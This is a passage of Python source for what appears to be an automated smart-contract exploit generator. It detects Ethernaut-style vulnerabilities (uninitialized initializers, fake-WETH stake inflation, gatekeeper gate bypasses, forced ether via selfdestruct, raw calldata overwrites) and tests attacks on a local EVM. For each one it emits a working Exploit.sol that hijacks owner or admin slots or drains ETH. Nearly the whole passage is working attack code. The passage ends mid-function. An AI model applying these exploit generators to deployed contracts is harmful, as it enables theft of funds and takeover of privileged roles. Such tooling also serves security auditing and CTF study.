        "        IWallet(proxy).setMaxBalance(uint256(uint160(address(this))));\n"
        "    }\n    receive() external payable {}\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (puzzle-wallet)","strategy":"puzzle-wallet","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":"proxy admin hijacked (storage collision + multicall)",
            "strategy":"puzzle-wallet:setMaxBalance","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"프록시/월렛 스토리지 충돌로 owner→admin 을 선점하고 중첩 multicall 예치 중복으로 잔액을 비운 뒤 admin 을 탈취했습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_uninitialized(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Motorbike 류(및 미보호 initializer 일반화): 구현/컨트랙트가 초기화되지
    않은 채 배포되어, 누구나 initialize() 를 호출해 특권 주소(upgrader/owner/admin)를 선점한다.
    배포자와 다른 계정에서 initialize() 를 호출해 특권 변수가 공격자로 바뀌는지로 증명한다."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    entry = None; priv = None
    for fn in _functions(tb):
        if not fn["external"] or len(fn["args"]) > 1:
            continue
        if not re.search(r"initial", fn["name"], re.I):
            continue
        mm = re.search(r"(\w+)\s*=\s*msg\.sender", fn["body"])
        if mm:
            entry = fn["name"]; priv = mm.group(1); break
    if not entry or not priv:
        return None
    _solcv, _evm = _solc_for(target_src)
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts:
        return None
    abi = arts[name]["abi"]
    if not _has_getter(abi, priv):
        return None
    ac = None
    for e in abi:
        if e.get("type")=="function" and e.get("name")==entry:
            ac = [i["type"] for i in e.get("inputs",[])]
    w3, acct = _mk_evm()
    accts = list(w3.eth.accounts); deployer = accts[1] if len(accts) > 1 else acct
    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
    try:
        taddr = w3.eth.wait_for_transaction_receipt(
            C.constructor(*[_default_for_type(t) for t in _abi_ctor_types(abi)]).transact({"from":deployer,"gas":6_000_000})).contractAddress
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    p0 = tc.functions[priv]().call()
    try:
        args = [ (Web3.to_checksum_address(acct) if t=="address" else _default_for_type(t)) for t in (ac or []) ]
        getattr(tc.functions, entry)(*args).transact({"from":acct,"gas":1_000_000})
    except Exception:
        return None
    p1 = tc.functions[priv]().call()
    if p1 == p0 or int(p1, 16) != int(acct, 16):
        return None
    poc = (HEADER +
        "// Strategy: uninitialized initializer (Ethernaut Motorbike). The contract is deployed\n"
        f"// without being initialized, so anyone can call {entry}() to seize the privileged\n"
        f"// slot `{priv}` (then e.g. upgradeToAndCall to arbitrary code).\n"
        f"interface IT {{ function {entry}({','.join(ac or [])}) external; }}\n"
        "contract Exploit {\n"
        "    function run(address t) external {\n"
        f"        IT(t).{entry}({', '.join('address(this)' if x=='address' else '0' for x in (ac or []))});\n"
        "    }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (uninitialized)","strategy":"uninitialized","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":f"{priv} hijacked via uninitialized initializer",
            "strategy":f"uninitialized:{entry}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"초기화되지 않은 컨트랙트의 initialize() 를 호출해 특권 슬롯(upgrader/owner 류)을 선점했습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_stake_accounting(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Stake 류: 외부 토큰(WETH) 이전이 실패/무동작이어도 사용자 지분을 올려주는
    회계 버그. 가짜 WETH(allowance=max, transferFrom=true no-op)를 물려 stake 를 부풀린 뒤
    unstake 로 시드된 실제 ETH 를 인출해 자금 유출을 관찰한다."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    if not (re.search(r"\bWETH\b", tb) and re.search(r"0x23b872dd|transferFrom", tb)):
        return None
    stake_fn = None; unstake_fn = None
    for fn in _functions(tb):
        b = fn["body"]
        if fn["external"] and len(fn["args"]) == 1 and fn["args"][0][0].startswith("uint") \
                and re.search(r"WETH\s*\.\s*call", b) and re.search(r"\[\s*msg\.sender\s*\]\s*\+=", b):
            stake_fn = fn["name"]
        if fn["external"] and len(fn["args"]) == 1 and fn["args"][0][0].startswith("uint") \
                and re.search(r"\.call\s*\{\s*value", b) and re.search(r"\[\s*msg\.sender\s*\]\s*-=", b):
            unstake_fn = fn["name"]
    if not (stake_fn and unstake_fn):
        return None
    _solcv, _evm = _solc_for(target_src)
    fake = (HEADER + "contract FakeWETH {\n"
        "    function allowance(address, address) external pure returns (uint256) { return type(uint256).max; }\n"
        "    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }\n}\n")
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"FakeWETH.sol":{"content":fake}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts or "FakeWETH" not in arts:
        return None
    abi = arts[name]["abi"]
    ctypes = _abi_ctor_types(abi)
    if "address" not in ctypes:
        return None
    w3, acct = _mk_evm()
    def dep(cn, args, value=0):
        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
        return w3.eth.wait_for_transaction_receipt(
            C.constructor(*args).transact({"from":acct,"value":value,"gas":6_000_000})).contractAddress
    try:
        weth = dep("FakeWETH", [])
        seed = 10**18
        cargs = [Web3.to_checksum_address(weth) if t == "address" else _default_for_type(t) for t in ctypes]
        taddr = dep(name, cargs, value=(seed if _ctor_payable(abi) else 0))
    except Exception:
        return None
    if seed and w3.eth.get_balance(taddr) == 0:  # 비-payable 생성자면 receive 로 시드
        try: w3.eth.send_transaction({"from":w3.eth.accounts[-1],"to":taddr,"value":seed,"gas":200000})
        except Exception: pass
    tc = w3.eth.contract(address=taddr, abi=abi)
    b0 = w3.eth.get_balance(taddr)
    if b0 == 0:
        return None
    amt = b0   # 시드 전액을 지분으로 부풀린 뒤 인출
    try:
        getattr(tc.functions, stake_fn)(amt).transact({"from":acct,"gas":1_000_000})
        getattr(tc.functions, unstake_fn)(amt).transact({"from":acct,"gas":1_000_000})
    except Exception:
        return None
    b1 = w3.eth.get_balance(taddr)
    if not (b1 < b0):
        return None
    poc = (HEADER +
        "// Strategy: Stake. StakeWETH credits the user even when the WETH transfer does not\n"
        "// move funds, so a fake WETH (allowance=max, transferFrom=true no-op) inflates the\n"
        "// stake; Unstake then withdraws the contract's real (seeded) ETH.\n"
        f"interface IS {{ function {stake_fn}(uint256) external returns (bool); function {unstake_fn}(uint256) external returns (bool); }}\n"
        "contract FakeWETH {\n"
        "    function allowance(address,address) external pure returns (uint256) { return type(uint256).max; }\n"
        "    function transferFrom(address,address,uint256) external pure returns (bool) { return true; }\n}\n"
        "contract Exploit {\n"
        "    function run(address t, uint256 amount) external {\n"
        f"        IS(t).{stake_fn}(amount);\n"
        f"        IS(t).{unstake_fn}(amount);\n"
        "    }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (stake-accounting)","strategy":"stake-accounting","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":f"funds drained ({(b0-b1)/1e18:g} ETH via fake-WETH stake)",
            "strategy":f"stake-accounting:{stake_fn}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "balance_before_wei":str(b0),"balance_after_wei":str(b1),
            "note":"가짜 WETH 로 실제 이전 없이 지분을 부풀린 뒤 unstake 로 시드된 실 ETH 를 인출했습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_gatekeeper_three(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Gatekeeper Three 류: 오타 construct0r 로 owner 선점, 같은 블록 password 로
    allowEntrance, receive 없는 공격자에게 send 가 실패하는 gateThree 를 통과해 entrant 탈취."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    # 특징: send(...) == false 게이트 + owner=msg.sender 무가드 세터 + entrant=tx.origin
    if not (re.search(r"\.\s*send\s*\([^)]*\)\s*==\s*false", tb) and re.search(r"entrant\s*=\s*tx\.origin", tb)):
        return None
    owner_setter = None; getallow = None; createtrick = None; enter = None; ent = "entrant"
    for fn in _functions(tb):
        b = fn["body"]
        if fn["external"] and not fn["args"] and re.search(r"\bowner\s*=\s*msg\.sender", b):
            owner_setter = fn["name"]
        if fn["external"] and len(fn["args"]) == 1 and fn["args"][0][0].startswith("uint") \
                and re.search(r"allowEntrance\s*=\s*true|checkPassword", b):
            getallow = fn["name"]
        if fn["external"] and not fn["args"] and re.search(r"new\s+\w+|trick\s*=", b):
            createtrick = fn["name"]
        if fn["external"] and re.search(r"entrant\s*=\s*tx\.origin", b):
            enter = fn["name"]
    if not (owner_setter and getallow and enter):
        return None
    _solcv, _evm = _solc_for(target_src)
    pwn_src = (HEADER +
        f"interface IG {{ function {owner_setter}() external;"
        + (f" function {createtrick}() external;" if createtrick else "")
        + f" function {getallow}(uint256) external; function {enter}() external; }}\n"
        "contract Pwn {\n"
        "    function run(address payable t) external payable {\n"
        + (f"        IG(t).{createtrick}();\n" if createtrick else "") +
        f"        IG(t).{getallow}(block.timestamp);\n"
        f"        IG(t).{owner_setter}();\n"
        "        (bool ok, ) = t.call{value: msg.value}(\"\"); require(ok, \"fund\");\n"
        f"        IG(t).{enter}();\n"
        "    }\n"
        "    // no receive() → gateThree 의 owner.send 가 실패해 게이트 통과\n"
        "}\n")
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts or "Pwn" not in arts:
        return None
    abi = arts[name]["abi"]
    w3, acct = _mk_evm()
    def deploy(cn, args):
        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
        return w3.eth.wait_for_transaction_receipt(
            C.constructor(*args).transact({"from":acct,"gas":9_000_000})).contractAddress
    try:
        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
        paddr = deploy("Pwn", [])
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    e0 = tc.functions[ent]().call() if _has_getter(abi, ent) else None
    pwn = w3.eth.contract(address=paddr, abi=arts["Pwn"]["abi"])
    try:
        pwn.functions.run(Web3.to_checksum_address(taddr)).transact({"from":acct,"value":10**16,"gas":5_000_000})
    except Exception:
        return None
    e1 = tc.functions[ent]().call() if _has_getter(abi, ent) else None
    if e0 is not None and e1 is not None and (e1 == e0 or int(e1, 16) == 0):
        return None
    poc = (HEADER +
        "// Strategy: Gatekeeper Three. Seize owner via the typo'd construct0r(), unlock via\n"
        "// same-block password, and pass gateThree because owner.send() to a receive-less\n"
        "// attacker returns false.\n"
        f"interface IG {{ function {owner_setter}() external;"
        + (f" function {createtrick}() external;" if createtrick else "")
        + f" function {getallow}(uint256) external; function {enter}() external; }}\n"
        "contract Exploit {\n"
        "    function run(address payable t) external payable {\n"
        + (f"        IG(t).{createtrick}();\n" if createtrick else "") +
        f"        IG(t).{getallow}(block.timestamp);\n"
        f"        IG(t).{owner_setter}();\n"
        "        (bool ok, ) = t.call{value: msg.value}(\"\"); require(ok);\n"
        f"        IG(t).{enter}();\n"
        "    }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (gatekeeper-three)","strategy":"gatekeeper-three","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":f"{ent} set via 3-gate bypass",
            "strategy":f"gatekeeper-three:{enter}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"construct0r 로 owner 선점, 같은 블록 password, receive 없는 공격자 send 실패로 3게이트를 통과해 entrant 를 탈취했습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_force(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Force 류: receive/fallback/payable 이 전혀 없는 '받을 수 없는' 컨트랙트에
    selfdestruct 로 ETH 를 강제 주입한다. 잔액이 0 에서 양수로 바뀌는지로 증명한다.
    오탐 억제: 외부 상태변경 함수가 없는 inert 컨트랙트일 때만 발화(Force 원형)."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    if re.search(r"\breceive\s*\(|\bfallback\s*\(|\bpayable\b", tb):
        return None
    # inert: 외부/public 함수가 없어야(있으면 다른 계열이 담당)
    if any(fn["external"] for fn in _functions(tb)):
        return None
    _solcv, _evm = _solc_for(target_src)
    pwn_src = (HEADER + "contract Pwn {\n"
               "    constructor(address t) payable { selfdestruct(payable(t)); }\n}\n")
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try:
        compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception:
        return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts or "Pwn" not in arts:
        return None
    w3, acct = _mk_evm()
    def deploy(cn, args, value=0):
        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
        return w3.eth.wait_for_transaction_receipt(
            C.constructor(*args).transact({"from":acct,"value":value,"gas":6_000_000})).contractAddress
    try:
        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(arts[name]["abi"])])
    except Exception:
        return None
    if w3.eth.get_balance(taddr) != 0:
        return None
    amt = 10**18
    try:
        deploy("Pwn", [Web3.to_checksum_address(taddr)], value=amt)
    except Exception:
        return None
    if w3.eth.get_balance(taddr) <= 0:
        return None
    poc = (HEADER +
        "// Strategy: forced ether (Ethernaut Force). The target cannot receive ETH\n"
        "// (no receive/fallback/payable), so we selfdestruct a funded contract into it.\n"
        "contract Exploit {\n"
        "    function run(address t) external payable { new Bomb{value: msg.value}(t); }\n"
        "}\n"
        "contract Bomb { constructor(address t) payable { selfdestruct(payable(t)); } }\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (force)","strategy":"force","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":"forced ether balance (0 → positive)",
            "strategy":"force:selfdestruct","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "balance_before_wei":"0","balance_after_wei":str(w3.eth.get_balance(taddr)),
            "note":"selfdestruct 로 받을 수 없는 컨트랙트에 ETH 를 강제 주입했습니다(balance 0→+).",
            "ms":int((time.time()-t0)*1000)}


def _synth_gatekeeper_two(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Gatekeeper Two 류: extcodesize(caller())==0 게이트(생성자에서 호출)와
    uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ key == max 게이트를 통과해
    entrant 를 tx.origin 으로 세팅. 공격자 생성자에서 키를 계산해 enter 를 호출한다."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    if not (re.search(r"extcodesize\s*\(\s*caller\s*\(\s*\)\s*\)", tb)
            and re.search(r"keccak256\s*\(\s*abi\.encodePacked\s*\(\s*msg\.sender", tb)
            and "^" in tb):
        return None
    # bytes8 인자를 받는 enter 류 함수 + entrant=tx.origin 세팅
    ent = None; setter = None
    for fn in _functions(tb):
        if any(a[0].startswith("bytes8") for a in fn["args"]) and fn["external"]:
            setter = fn["name"]
            mm = re.search(r"(\w+)\s*=\s*tx\.origin", fn["body"])
            if mm: ent = mm.group(1)
            break
    if not setter:
        return None
    _solcv, _evm = _solc_for(target_src)
    pwn_src = (HEADER +
        f"interface IT {{ function {setter}(bytes8) external returns (bool); }}\n"
        "contract Pwn {\n"
        "    constructor(address t) {\n"
        "        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);\n"
        f"        IT(t).{setter}(key);\n"
        "    }\n}\n")
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts or "Pwn" not in arts:
        return None
    abi = arts[name]["abi"]
    w3, acct = _mk_evm()
    def deploy(cn, args):
        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
        return w3.eth.wait_for_transaction_receipt(
            C.constructor(*args).transact({"from":acct,"gas":6_000_000})).contractAddress
    try:
        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    e0 = tc.functions[ent]().call() if (ent and _has_getter(abi, ent)) else None
    try:
        deploy("Pwn", [Web3.to_checksum_address(taddr)])   # 생성자에서 enter 호출
    except Exception:
        return None
    e1 = tc.functions[ent]().call() if (ent and _has_getter(abi, ent)) else None
    if ent and e1 is not None and e1 == e0:
        return None
    poc = (HEADER +
        "// Strategy: Gatekeeper Two. Call enter() from the attacker CONSTRUCTOR so\n"
        "// extcodesize(caller)==0, with key = uint64(keccak256(this)) ^ type(uint64).max.\n"
        f"interface IT {{ function {setter}(bytes8) external returns (bool); }}\n"
        "contract Exploit {\n"
        "    constructor(address t) {\n"
        "        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);\n"
        f"        IT(t).{setter}(key);\n"
        "    }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (gatekeeper-two)","strategy":"gatekeeper-two","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":f"{ent or 'entrant'} set via constructor-time gate bypass",
            "strategy":f"gatekeeper-two:{setter}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"생성자에서 enter 호출(extcodesize=0)과 XOR 키로 3개 게이트를 통과해 entrant 를 탈취했습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_magicnumber(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Magic Number 류: 10바이트 이하 런타임으로 42(0x2a)를 반환하는 solver 를
    등록. 최소 초기화+런타임 바이트코드를 원시 배포해 setSolver 로 등록하고, 코드 길이
    ≤10 이며 임의 호출에 42 를 반환하는지 확인한다."""
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    # setSolver(address) 류 세터 + solver 상태변수
    setter = None
    for fn in _functions(tb):
        if fn["external"] and len(fn["args"]) == 1 and fn["args"][0][0] == "address" \
                and re.search(r"solver\s*=", fn["body"]):
            setter = fn["name"]; break
    if not setter and re.search(r"\bsolver\b", tb):
        for fn in _functions(tb):
            if fn["external"] and len(fn["args"]) == 1 and fn["args"][0][0] == "address":
                setter = fn["name"]; break
    if not setter:
        return None
    import solcx
    _solcv, _evm = _solc_for(target_src)
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts:
        return None
    abi = arts[name]["abi"]
    w3, acct = _mk_evm()
    def deploy(cn, args):
        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
        return w3.eth.wait_for_transaction_receipt(
            C.constructor(*args).transact({"from":acct,"gas":6_000_000})).contractAddress
    try:
        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
    except Exception:
        return None
    # 최소 solver: init(12B) + runtime(10B). runtime: PUSH1 0x2a; PUSH1 0; MSTORE; PUSH1 0x20; PUSH1 0; RETURN
    creation = "0x600a600c600039600a6000f3602a60005260206000f3"
    try:
        rc = w3.eth.wait_for_transaction_receipt(
            w3.eth.send_transaction({"from":acct,"data":creation,"gas":200000}))
        solver = rc.contractAddress
    except Exception:
        return None
    if solver is None:
        return None
    code = w3.eth.get_code(solver)
    if len(code) == 0 or len(code) > 10:
        return None
    # 42 반환 확인 (임의 셀렉터 호출)
    try:
        ret = w3.eth.call({"to": solver, "data": "0x00000000"})
        if int.from_bytes(ret[-32:], "big") != 42:
            return None
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    try:
        getattr(tc.functions, setter)(Web3.to_checksum_address(solver)).transact({"from":acct,"gas":200000})
    except Exception:
        return None
    poc = (HEADER +
        "// Strategy: Magic Number. Deploy a <=10-byte runtime that returns 42 for any\n"
        "// call, then register it via setSolver. Runtime: 602a60005260206000f3.\n"
        f"interface IT {{ function {setter}(address) external; }}\n"
        "contract Exploit {\n"
        "    function run(address t) external {\n"
        "        bytes memory code = hex\"600a600c600039600a6000f3602a60005260206000f3\";\n"
        "        address solver; assembly { solver := create(0, add(code, 0x20), mload(code)) }\n"
        f"        IT(t).{setter}(solver);\n"
        "    }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (magic-number)","strategy":"magic-number","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":"solver returns 42 in <=10 bytes",
            "strategy":f"magic-number:{setter}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"10바이트 런타임(602a60005260206000f3)으로 42 를 반환하는 solver 를 등록했습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_gatekeeper_one(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Gatekeeper One 류: gasleft()%N==0 게이트를 컨트랙트 내 루프로 브루트포스하고
    (msg.sender!=tx.origin 는 컨트랙트 호출로, 키 플로우는 tx.origin 마스크로) 통과해 entrant 탈취."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    gm = re.search(r"gasleft\s*\(\s*\)\s*%\s*(\d+)", tb)
    if not gm or not re.search(r"uint16\s*\(\s*uint160\s*\(\s*tx\.origin", tb):
        return None
    N = int(gm.group(1))
    ent = None; setter = None
    for fn in _functions(tb):
        if any(a[0].startswith("bytes8") for a in fn["args"]) and fn["external"]:
            setter = fn["name"]
            mm = re.search(r"(\w+)\s*=\s*tx\.origin", fn["body"])
            if mm: ent = mm.group(1)
            break
    if not setter:
        return None
    _solcv, _evm = _solc_for(target_src)
    pwn_src = (HEADER +
        f"interface IT {{ function {setter}(bytes8) external returns (bool); }}\n"
        "contract Pwn {\n"
        "    function attack(address t) external returns (bool) {\n"
        "        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);\n"
        f"        for (uint256 i = 0; i < {N}; i++) {{\n"
        f"            (bool ok, ) = t.call{{gas: {N*7} + i}}(abi.encodeWithSelector(IT.{setter}.selector, key));\n"
        "            if (ok) return true;\n"
        "        }\n"
        "        revert(\"no gas match\");\n"
        "    }\n}\n")
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts or "Pwn" not in arts:
        return None
    abi = arts[name]["abi"]
    w3, acct = _mk_evm()
    def deploy(cn, args):
        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
        return w3.eth.wait_for_transaction_receipt(
            C.constructor(*args).transact({"from":acct,"gas":6_000_000})).contractAddress
    try:
        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
        paddr = deploy("Pwn", [])
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    e0 = tc.functions[ent]().call() if (ent and _has_getter(abi, ent)) else None
    pwn = w3.eth.contract(address=paddr, abi=arts["Pwn"]["abi"])
    try:
        pwn.functions.attack(Web3.to_checksum_address(taddr)).transact({"from":acct,"gas":28_000_000})
    except Exception:
        return None
    e1 = tc.functions[ent]().call() if (ent and _has_getter(abi, ent)) else None
    if ent and e1 is not None and e1 == e0:
        return None
    poc = (HEADER +
        "// Strategy: Gatekeeper One. Call from a contract (gateOne), brute-force the\n"
        f"// gasleft()%{N}==0 gate in a loop, key = uint64(tx.origin) & 0xFFFFFFFF0000FFFF.\n"
        f"interface IT {{ function {setter}(bytes8) external returns (bool); }}\n"
        "contract Exploit {\n"
        "    function run(address t) external {\n"
        "        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);\n"
        f"        for (uint256 i = 0; i < {N}; i++) {{\n"
        f"            (bool ok, ) = t.call{{gas: {N*7} + i}}(abi.encodeWithSelector(IT.{setter}.selector, key));\n"
        "            if (ok) return;\n"
        "        }\n"
        "    }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (gatekeeper-one)","strategy":"gatekeeper-one","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":f"{ent or 'entrant'} set via gas brute-force + key",
            "strategy":f"gatekeeper-one:{setter}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":f"gasleft()%{N}==0 게이트를 루프로 브루트포스하고 tx.origin 마스크 키로 통과해 entrant 를 탈취했습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_higher_order(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut HigherOrder 류: 작은 파라미터(uint8)를 선언했지만 assembly 가 calldata
    32바이트 전체를 sstore 하는 함수. ABI 로는 255 초과 불가지만 원시 calldata 로 큰 값을
    써넣어 임계(>N) 게이트를 통과하고 특권(commander)을 탈취한다."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    if not re.search(r"sstore\s*\(\s*\w+[_.]?slot\s*,\s*calldataload\s*\(", tb) \
            and not re.search(r"calldataload\s*\(\s*4\s*\)", tb):
        return None
    # 원시 calldata 쓰기 함수(작은 인자) + 임계 게이트로 특권 대입 함수
    writer = None; wsig = None
    claim = None; priv = None; thresh = None
    for fn in _functions(tb):
        if fn["external"] and re.search(r"calldataload\s*\(", fn["body"]) and fn["args"]:
            writer = fn["name"]; wsig = "(" + ",".join(a[0] for a in fn["args"]) + ")"
        cm = re.search(r"(\w+)\s*>\s*(\d+)\)?\s*\)?\s*[\{]?\s*(\w+)\s*=\s*msg\.sender", fn["body"])
        if fn["external"] and cm:
            claim, thresh, priv = fn["name"], int(cm.group(2)), cm.group(3)
    if not writer or not claim or priv is None:
        return None
    _solcv, _evm = _solc_for(target_src)
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts:
        return None
    abi = arts[name]["abi"]
    w3, acct = _mk_evm()
    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
    try:
        r = w3.eth.wait_for_transaction_receipt(
            C.constructor(*[_default_for_type(t) for t in _abi_ctor_types(abi)]).transact({"from":acct,"gas":6_000_000}))
        taddr = r.contractAddress
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    p0 = tc.functions[priv]().call() if _has_getter(abi, priv) else None
    sel = Web3.keccak(text=f"{writer}{wsig}")[:4]
    big = (thresh + 1).to_bytes(32, "big") if thresh < (1<<255) else (2**256-1).to_bytes(32,"big")
    try:
        w3.eth.send_transaction({"from":acct,"to":taddr,"data":"0x"+sel.hex()+big.hex(),"gas":200000})
        getattr(tc.functions, claim)().transact({"from":acct,"gas":200000})
    except Exception:
        return None
    p1 = tc.functions[priv]().call() if _has_getter(abi, priv) else None
